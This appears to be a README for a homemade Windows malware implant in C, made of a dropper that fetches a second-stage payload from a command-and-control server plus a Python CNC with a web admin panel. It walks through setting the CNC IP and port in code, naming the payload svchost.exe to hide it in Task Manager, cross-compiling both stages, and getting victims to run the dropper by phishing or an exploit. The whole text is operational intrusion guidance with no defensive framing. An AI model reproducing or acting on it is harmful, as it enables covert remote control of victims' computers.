A cool little implant made in C.


Setup:


Open drop.c and find:

```C
    wcscat(l, L"\\dropped.exe");

    if (!f(L"192.168.1.230", 5706, L"dropped.exe", l)) return 1;
```

replace dropped.exe with the name of the payload you're gonna compile in a second (optional if not changing name but naming it svchost.exe will hide it in Task Manager)

replace 192.168.1.230 with your CNC's IP address

replace 5706 with the port your CNC is using, make sure it's accessable (optional)


Open dropped.c and find:

```C
#define A L"192.168.1.230"
#define B 5706
```

replace 192.168.1.230 with your CNC's IP address

replace 5706 with the port your CNC is using


Build:

```bash
x86_64-w64-mingw32-gcc -O2 -mwindows drop.c -o bingledrop.exe -lwininet
x86_64-w64-mingw32-gcc -O2 -mwindows dropped.c -o dropped.exe -lwininet
```

or for 32-bit systems

```bash
i686-w64-mingw32-gcc -O2 -mwindows drop.c -o bingledrop.exe -lwininet
i686-w64-mingw32-gcc -O2 -mwindows dropped.c -o svchost.exe -lwininet
```

but if you want both you need to build x64, then modify the dropper to download a different filename than the x64 build then build both stage 1 and stage 2 as 32-bit

I might provide windows build commands later but windows yucky and you can probably figure it out

place dropped.exe in the payloads folder



Use:

```bash
python cnc.py 5706 (replace 5706 with another port if you like, but make sure you configured it in your binaries)
```

note: CNC will open on port 8080 if no port specified

open a web browser and visit http://127.0.0.1:(CNC port)/admin

or if accessing the CNC remotely (like SSH) visit http://(CNC IP):(CNC port)/admin


Follow the examples to build a command, and click Deploy Command

Get another computer to run your dropper (or stage 2 if for some reason it fails to run the dropper, which is sometimes the case) via phishing or an exploit (you can use my Eternal repository to perform an exploit on a vulnerable target, you'll usually want a 32-bit binary for this.)

Boom! You're in!

<img width="523" height="561" alt="Screenshot 2026-07-24 021408" src="https://github.com/user-attachments/assets/8ab7b9a0-34c1-438e-b1da-e746b87b4f0a" />
